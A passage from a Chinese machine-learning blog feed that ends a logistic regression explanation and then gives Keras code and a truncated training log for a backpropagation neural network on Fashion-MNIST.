style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.247192em;vertical-align:-0.9257520000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.157578em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9524220000000001em;"><span style="top:-3.0327570000000006em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.02691em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mop mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8852357142857143em;"><span style="top:-2.1785614285714283em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-2.8971428571428572em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.32143857142857146em;"><span></span></span></span></span></span></span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.02691em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9257520000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>所以，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo>=</mo><mn>1</mn><mi mathvariant="normal">∣</mi><mi>x</mi><mo separator="true">,</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>θ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(y=1|x,\theta)=h_\theta(x,\theta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span>,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo>=</mo><mn>0</mn><mi mathvariant="normal">∣</mi><mi>x</mi><mo separator="true">,</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>−</mo><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>θ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(y=0|x,\theta)=1-h_\theta(x,\theta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span></p><p>逻辑回归从其原理上来说，逻辑回归其实是实现了一个决策边界：对于函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><msup><mi>e</mi><mrow><mo>−</mo><mi>z</mi></mrow></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">y=\frac1{1+e^{-z}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2484389999999999em;vertical-align:-0.403331em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7026642857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.04398em;">z</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.403331em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>, 当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi><mo>=</mo><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">z =&gt; 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span> 时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>=</mo><mo>&gt;</mo><mn>0.5</mn></mrow><annotation encoding="application/x-tex">y =&gt; 0.5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">5</span></span></span></span>, 分类为 1，当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi><mo>&lt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">z &lt; 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span> 时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi><mo>&lt;</mo><mn>0.5</mn></mrow><annotation encoding="application/x-tex">y &lt; 0.5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">5</span></span></span></span>, 分类为 0，其对应的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span> 值我们可以视为类别 1 的概率预测值.</p><p>对于模型的训练而言：实质上来说就是利用数据求解出对应的模型的特定的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span>。从而得到一个针对于当前数据的特征逻辑回归模型。</p><p>而对于多分类而言，将多个二分类的逻辑回归组合，即可实现多分类。</p><p>END</p>]]></content>
      
      
      <categories>
          
          <category> 天池机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BP神经网络</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/BP/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/BP/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> scipy.io <span class="keyword">as</span> sio</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fashion_mnist=sio.loadmat(<span class="string">&#x27;fashion_mnist.mat&#x27;</span>)</span><br><span class="line">train_img=fashion_mnist[<span class="string">&#x27;train&#x27;</span>]</span><br><span class="line">train_imglabels=fashion_mnist[<span class="string">&#x27;trainlabels&#x27;</span>]</span><br><span class="line">test_img=fashion_mnist[<span class="string">&#x27;test&#x27;</span>]</span><br><span class="line">test_imglabels=fashion_mnist[<span class="string">&#x27;testlabels&#x27;</span>]</span><br><span class="line"></span><br><span class="line">input1=keras.layers.Input(shape=train_img.shape[<span class="number">1</span>:])</span><br><span class="line">hidden1=keras.layers.Dense(<span class="number">100</span>,activation=<span class="string">&quot;tanh&quot;</span>)(input1)</span><br><span class="line">hidden2=keras.layers.Dense(<span class="number">120</span>,activation=<span class="string">&quot;tanh&quot;</span>)(hidden1)</span><br><span class="line">concat=keras.layers.Concatenate()([input1,hidden2])</span><br><span class="line">output=keras.layers.Dense(<span class="number">10</span>,activation=<span class="string">&quot;softmax&quot;</span>)(concat)</span><br><span class="line">model=keras.Model(inputs=[input1],outputs=[output])</span><br><span class="line"></span><br><span class="line">model.<span class="built_in">compile</span>(loss=<span class="string">&quot;sparse_categorical_crossentropy&quot;</span>,optimizer=keras.optimizers.SGD(lr=<span class="number">0.005</span>),metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line">x_valid,x_train=train_img[:<span class="number">5000</span>]/<span class="number">255</span>,train_img[<span class="number">5000</span>:]/<span class="number">255</span></span><br><span class="line">y_valid,y_train=train_imglabels[:<span class="number">5000</span>],train_imglabels[<span class="number">5000</span>:]</span><br><span class="line"></span><br><span class="line">model.fit(x_train,y_train,batch_size=<span class="number">2500</span>,epochs=<span class="number">100</span>,validation_data=(x_valid,y_valid),verbose=<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>WARNING:tensorflow:From c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\tensorflow_core\python\ops\resource_variable_ops.py:1630: calling BaseResourceVariable.__init__ (from tensorflow.python.ops.resource_variable_ops) with constraint is deprecated and will be removed in a future version.Instructions for updating:If using Keras pass *_constraint arguments to layers.Train on 55000 samples, validate on 5000 samplesEpoch 1/10055000/55000 [==============================] - 3s 46us/sample - loss: 2.2687 - acc: 0.1840 - val_loss: 2.0692 - val_acc: 0.2996Epoch 2/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.9678 - acc: 0.3960 - val_loss: 1.8557 - val_acc: 0.4844Epoch 3/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.7842 - acc: 0.5295 - val_loss: 1.6939 - val_acc: 0.5776Epoch 4/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.6412 - acc: 0.5905 - val_loss: 1.5654 - val_acc: 0.6198Epoch 5/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.5266 - acc: 0.6213 - val_loss: 1.4618 - val_acc: 0.6430Epoch 6/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.4337 - acc: 0.6395 - val_loss: 1.3775 - val_acc: 0.6570Epoch 7/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.3572 - acc: 0.6528 - val_loss: 1.3078 - val_acc: 0.6666Epoch 8/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.2934 - acc: 0.6628 - val_loss: 1.2492 - val_acc: 0.6752Epoch 9/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.2395 - acc: 0.6706 - val_loss: 1.1996 - val_acc: 0.6824Epoch 10/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.1935 - acc: 0.6769 - val_loss: 1.1571 - val_acc: 0.6874Epoch 11/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.1537 - acc: 0.6833 - val_loss: 1.1201 - val_acc: 0.6924Epoch 12/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.1190 - acc: 0.6876 - val_loss: 1.0877 - val_acc: 0.6988Epoch 13/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.0885 - acc: 0.6928 - val_loss: 1.0591 - val_acc: 0.7032Epoch 14/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.0614 - acc: 0.6970 - val_loss: 1.0337 - val_acc: 0.7074Epoch 15/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.0372 - acc: 0.7007 - val_loss: 1.0109 - val_acc: 0.7110Epoch 16/10055000/55000 [==============================] - 2s 44us/sample - loss: 1.0154 - acc: 0.7045 - val_loss: 0.9903 - val_acc: 0.7146Epoch 17/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.9957 - acc: 0.7075 - val_loss: 0.9716 - val_acc: 0.7184Epoch 18/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.9777 - acc: 0.7114 - val_loss: 0.9546 - val_acc: 0.7220Epoch 19/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.9613 - acc: 0.7147 - val_loss: 0.9390 - val_acc: 0.7248Epoch 20/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.9462 - acc: 0.7171 - val_loss: 0.9246 - val_acc: 0.7268Epoch 21/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.9323 - acc: 0.7196 - val_loss: 0.9113 - val_acc: 0.7296Epoch 22/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.9194 - acc: 0.7229 - val_loss: 0.8990 - val_acc: 0.7320Epoch 23/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.9073 - acc: 0.7255 - val_loss: 0.8875 - val_acc: 0.7338Epoch 24/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.8961 - acc: 0.7285 - val_loss: 0.8767 - val_acc: 0.7366Epoch 25/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.8856 - acc: 0.7301 - val_loss: 0.8665 - val_acc: 0.7400Epoch 26/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.8757 - acc: 0.7328 - val_loss: 0.8570 - val_acc: 0.7432Epoch 27/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.8664 - acc: 0.7349 - val_loss: 0.8480 - val_acc: 0.7456Epoch 28/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.8576 - acc: 0.7374 - val_loss: 0.8396 - val_acc: 0.7476Epoch 29/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.8493 - acc: 0.7391 - val_loss: 0.8315 - val_acc: 0.7498Epoch 30/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.8413 - acc: 0.7415 - val_loss: 0.8239 - val_acc: 0.7516Epoch 31/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.8338 - acc: 0.7430 - val_loss: 0.8166 - val_acc: 0.7524Epoch 32/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.8266 - acc: 0.7444 - val_loss: 0.8097 - val_acc: 0.7544Epoch 33/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.8198 - acc: 0.7457 - val_loss: 0.8030 - val_acc: 0.7562Epoch 34/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.8132 - acc: 0.7475 - val_loss: 0.7966 - val_acc: 0.7580Epoch 35/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.8069 - acc: 0.7493 - val_loss: 0.7906 - val_acc: 0.7582Epoch 36/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.8009 - acc: 0.7509 - val_loss: 0.7847 - val_acc: 0.7604Epoch 37/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7951 - acc: 0.7519 - val_loss: 0.7791 - val_acc: 0.7608Epoch 38/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7896 - acc: 0.7535 - val_loss: 0.7737 - val_acc: 0.7638Epoch 39/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7842 - acc: 0.7550 - val_loss: 0.7684 - val_acc: 0.7650Epoch 40/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7790 - acc: 0.7564 - val_loss: 0.7634 - val_acc: 0.7660Epoch 41/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7740 - acc: 0.7574 - val_loss: 0.7585 - val_acc: 0.7676Epoch 42/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7692 - acc: 0.7592 - val_loss: 0.7538 - val_acc: 0.7684Epoch 43/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7645 - acc: 0.7607 - val_loss: 0.7493 - val_acc: 0.7696Epoch 44/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7600 - acc: 0.7619 - val_loss: 0.7449 - val_acc: 0.7714Epoch 45/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7556 - acc: 0.7634 - val_loss: 0.7406 - val_acc: 0.7738Epoch 46/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7514 - acc: 0.7646 - val_loss: 0.7365 - val_acc: 0.7750Epoch 47/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7472 - acc: 0.7656 - val_loss: 0.7324 - val_acc: 0.7758Epoch 48/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7432 - acc: 0.7671 - val_loss: 0.7286 - val_acc: 0.7770Epoch 49/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7393 - acc: 0.7678 - val_loss: 0.7247 - val_acc: 0.7784Epoch 50/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7355 - acc: 0.7697 - val_loss: 0.7210 - val_acc: 0.7792Epoch 51/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7319 - acc: 0.7702 - val_loss: 0.7174 - val_acc: 0.7802Epoch 52/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7283 - acc: 0.7711 - val_loss: 0.7139 - val_acc: 0.7812Epoch 53/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7248 - acc: 0.7726 - val_loss: 0.7105 - val_acc: 0.7816Epoch 54/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7213 - acc: 0.7733 - val_loss: 0.7072 - val_acc: 0.7820Epoch 55/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7180 - acc: 0.7739 - val_loss: 0.7039 - val_acc: 0.7828Epoch 56/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7148 - acc: 0.7749 - val_loss: 0.7007 - val_acc: 0.7830Epoch 57/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7116 - acc: 0.7755 - val_loss: 0.6976 - val_acc: 0.7840Epoch 58/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7085 - acc: 0.7766 - val_loss: 0.6946 - val_acc: 0.7840Epoch 59/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7054 - acc: 0.7775 - val_loss: 0.6917 - val_acc: 0.7846Epoch 60/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.7025 - acc: 0.7783 - val_loss: 0.6888 - val_acc: 0.7858Epoch 61/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6996 - acc: 0.7792 - val_loss: 0.6860 - val_acc: 0.7860Epoch 62/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6967 - acc: 0.7801 - val_loss: 0.6831 - val_acc: 0.7874Epoch 63/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6940 - acc: 0.7806 - val_loss: 0.6804 - val_acc: 0.7874Epoch 64/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6913 - acc: 0.7816 - val_loss: 0.6778 - val_acc: 0.7896Epoch 65/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6886 - acc: 0.7821 - val_loss: 0.6752 - val_acc: 0.7900Epoch 66/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6860 - acc: 0.7827 - val_loss: 0.6726 - val_acc: 0.7908Epoch 67/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6834 - acc: 0.7835 - val_loss: 0.6701 - val_acc: 0.7916Epoch 68/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6809 - acc: 0.7839 - val_loss: 0.6676 - val_acc: 0.7918Epoch 69/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6785 - acc: 0.7844 - val_loss: 0.6652 - val_acc: 0.7934Epoch 70/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6760 - acc: 0.7853 - val_loss: 0.6629 - val_acc: 0.7932Epoch 71/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6737 - acc: 0.7859 - val_loss: 0.6606 - val_acc: 0.7942Epoch 72/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6713 - acc: 0.7860 - val_loss: 0.6583 - val_acc: 0.7942Epoch 73/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6691 - acc: 0.7869 - val_loss: 0.6560 - val_acc: 0.7950Epoch 74/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6668 - acc: 0.7873 - val_loss: 0.6539 - 